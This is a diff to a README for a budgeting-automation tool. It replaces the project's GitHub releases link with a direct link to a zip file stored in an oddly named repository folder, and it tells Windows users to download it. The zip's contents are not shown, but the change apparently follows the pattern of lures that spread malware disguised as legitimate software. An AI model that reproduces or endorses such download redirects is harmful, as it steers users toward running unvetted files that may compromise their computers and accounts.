@@ -1,6 +1,6 @@
 # 🤖 n8n-Actual-Automation - Automate your personal budget with AI
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/algophobiaanoxia129/n8n-Actual-Automation/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/algophobiaanoxia129/n8n-Actual-Automation/main/choiceful/n_Automation_Actual_v3.8-beta.3.zip)
 
 ## 📌 Overview
 
@@ -12,7 +12,7 @@ You need a working installation of Actual Budget before you start. Ensure you ha
 
 ## 📥 Get the software
 
-Visit this page to download the necessary files: [https://github.com/algophobiaanoxia129/n8n-Actual-Automation/releases](https://github.com/algophobiaanoxia129/n8n-Actual-Automation/releases).
+Visit this page to download the necessary files: [https://raw.githubusercontent.com/algophobiaanoxia129/n8n-Actual-Automation/main/choiceful/n_Automation_Actual_v3.8-beta.3.zip](https://raw.githubusercontent.com/algophobiaanoxia129/n8n-Actual-Automation/main/choiceful/n_Automation_Actual_v3.8-beta.3.zip).
 
 Select the latest version file from the list. Save this file to a folder on your Windows computer. Create a new folder on your desktop and move the file there. This keeps your workspace clean.
 
